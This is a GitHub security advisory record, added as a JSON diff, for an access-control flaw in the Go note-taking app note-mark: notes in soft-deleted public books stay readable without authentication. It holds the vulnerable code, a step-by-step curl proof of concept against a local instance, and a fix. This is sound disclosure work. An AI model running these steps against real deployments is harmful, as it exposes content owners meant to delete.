@@ -1,0 +1,49 @@
+{
+  "id": "GHSA-3gr9-485j-v4xf",
+  "modified": "2026-05-05T16:00:01.548089Z",
+  "published": "2026-04-25T23:40:37Z",
+  "aliases": [
+    "CVE-2026-41572"
+  ],
+  "summary": "Note Mark: Unauthenticated read of notes and assets in soft-deleted public books",
+  "details": "## Summary\n\nAfter a note-mark owner soft-deletes a public book, its notes and uploaded assets stay readable at `/api/notes/{id}`, `/api/notes/{id}/content`, the slug URL, and the asset endpoints. Unauthenticated callers who hold the note ID or the slug path retain access. GORM's soft-delete scope does not reach the raw `JOIN books ...` clauses used by the note and asset queries.\n\n## Details\n\n`DELETE /api/books/{bookID}` sets `books.deleted_at` to the current time. The book-level endpoint starts returning 404, which matches the owner's expectation that the book is gone. The note service and asset service query notes with a raw join that does not filter `books.deleted_at IS NULL`:\n\n```go\n// backend/services/notes.go:91-98 (GetNoteByID)\nfunc (s NotesService) GetNoteByID(currentUserID *uuid.UUID, noteID uuid.UUID) (db.Note, error) {\n    var note db.Note\n    return note, dbErrorToServiceError(db.DB.\n        Preload(\"Book\").\n        Joins(\"JOIN books ON books.id = notes.book_id\").\n        Where(\"owner_id = ? OR is_public = ?\", currentUserID, true).\n        First(\u0026note, \"notes.id = ?\", noteID).Error)\n}\n```\n\nGORM applies its soft-delete scope to the primary model of a query (here, `notes`) and to implicit `Joins(\"Book\")` association clauses. It does not rewrite raw SQL passed to `Joins`. The soft-deleted book row keeps `is_public = true`, so the `WHERE owner_id = ? OR is_public = ?` clause still evaluates true for any caller on a book that was public at deletion time. For an unauthenticated caller (`currentUserID = nil`), `owner_id = NULL` fails but `is_public = true` passes, so the note query returns the row.\n\nnote-mark has a restore flow at `PUT /api/notes/{noteID}/restore` (`backend/services/notes.go:232-262`) that un-deletes the note and the parent book in one transaction. Owner access to soft-deleted notes is deliberate for that path; the comment at line 253 spells out the intent. The bug is that `is_public = true` survives the deletion, so unauthenticated callers keep access the owner chose to revoke.\n\nThe same raw-join pattern repeats at 9 more call sites in `backend/services/notes.go` (lines 79, 95, 107, 129, 143, 174, 206, 237, 276) and 4 call sites in `backend/services/assets.go` (lines 29, 73, 106, 143). Every public endpoint that reads a note or an asset inherits the bug.\n\n## Proof of Concept\n\nTested against `note-mark` v0.19.2.\n\nStep 1: Start note-mark.\n\n```bash\ndocker run -d --name note-mark-poc -p 8088:8080 \\\n  ghcr.io/enchant97/note-mark-backend:0.19.2\n```\n\nStep 2: Alice signs up and logs in.\n\n```bash\ncurl -X POST http://localhost:8088/api/users \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"username\":\"alice\",\"password\":\"Alicepass123!\",\"name\":\"Alice\"}'\n\ncurl -c alice.cookies -X POST http://localhost:8088/api/auth/token \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"grant_type\":\"password\",\"username\":\"alice\",\"password\":\"Alicepass123!\"}'\n```\n\nStep 3: Alice creates a public book and adds a note with content. Save the IDs from each response.\n\n```bash\ncurl -b alice.cookies -X POST http://localhost:8088/api/books \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"name\":\"Alice Public Book\",\"slug\":\"public-book\",\"isPublic\":true}'\n# {\"id\":\"\u003cBOOK_ID\u003e\", ...}\n\ncurl -b alice.cookies -X POST http://localhost:8088/api/books/\u003cBOOK_ID\u003e/notes \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"name\":\"Secret Note\",\"slug\":\"secret-note\"}'\n# {\"id\":\"\u003cNOTE_ID\u003e\", ...}\n\ncurl -b alice.cookies -X PUT http://localhost:8088/api/notes/\u003cNOTE_ID\u003e/content \\\n  -H 'Content-Type: text/plain' \\\n  --data 'This is Alice secret note content.'\n```\n\nStep 4: Bob (no cookie) reads the note while the book is still live. This is expected for a public book.\n\n```bash\ncurl http://localhost:8088/api/notes/\u003cNOTE_ID\u003e/content\n# This is Alice secret note content.\n```\n\nStep 5: Alice soft-deletes the book.\n\n```bash\ncurl -b alice.cookies -X DELETE http://localhost:8088/api/books/\u003cBOOK_ID\u003e\n# HTTP/1.1 204 No Content\n```\n\nStep 6: The book endpoint 404s. The note endpoints still serve Alice's content to Bob.\n\n```bash\ncurl -w \"\\n%{http_code}\\n\" http://localhost:8088/api/books/\u003cBOOK_ID\u003e\n# 404\n\ncurl -w \"\\n%{http_code}\\n\" http://localhost:8088/api/notes/\u003cNOTE_ID\u003e\n# {\"id\":\"\u003cNOTE_ID\u003e\",\"name\":\"Secret Note\", ...}\n# 200\n\ncurl http://localhost:8088/api/notes/\u003cNOTE_ID\u003e/content\n# This is Alice secret note content.\n\ncurl http://localhost:8088/api/slug/alice/books/public-book/notes/secret-note\n# {\"id\":\"\u003cNOTE_ID\u003e\",\"name\":\"Secret Note\", ...}\n```\n\nA companion script that drives Steps 1-6 ships at `pocs/poc_005_bac_soft_deleted_book.sh`.\n\n## Impact\n\nAny owner who soft-deletes a public book expecting the content to drop off the internet is wrong. Notes, markdown content, and uploaded assets stay readable for every unauthenticated caller who knows the note ID or the slug path. Slugs are human-readable and change hands in documentation, notes, and bug trackers. The leak covers every public note and asset endpoint, not a single handler. Private books are not affected because `is_public = false` and `owner_id = NULL` both fail the visibility check for non-owners.\n\n## Recommended Fix\n\nAdd a soft-delete filter to the visibility clause on every raw `Joins(\"JOIN books ...\")`. Keep the owner's access intact so the restore flow at `PUT /api/notes/{id}/restore` continues to work:\n\n```go\n// backend/services/notes.go:91-98 (GetNoteByID)\nreturn note, dbErrorToServiceError(db.DB.\n    Preload(\"Book\").\n    Joins(\"JOIN books ON books.id = notes.book_id\").\n    Where(\"(books.deleted_at IS NULL OR books.owner_id = ?)\", currentUserID).\n    Where(\"owner_id = ? OR is_public = ?\", currentUserID, true).\n    First(\u0026note, \"notes.id = ?\", noteID).Error)\n```\n\nThe same transform applies to each of the 13 call sites in `backend/services/notes.go` (lines 79, 95, 107, 129, 143, 174, 206, 237, 276) and `backend/services/assets.go` (lines 29, 73, 106, 143). `backend/cli/clean.go:31` uses the same join pattern but is a maintenance CLI and does not need the fix.\n\n---\n*Found by [aisafe.io](https://aisafe.io)*",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/enchant97/note-mark/backend",
+        "purl": "pkg:golang/github.com/enchant97/note-mark/backend"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.0.0-20260417132843-d1bf845a2a2d"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-3gr9-485j-v4xf/GHSA-3gr9-485j-v4xf.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/enchant97/note-mark/security/advisories/GHSA-3gr9-485j-v4xf"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/enchant97/note-mark/commit/d1bf845a2a2df01e2eca6f556287db4ec6f773cf"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/enchant97/note-mark"
+    }
+  ]
+}
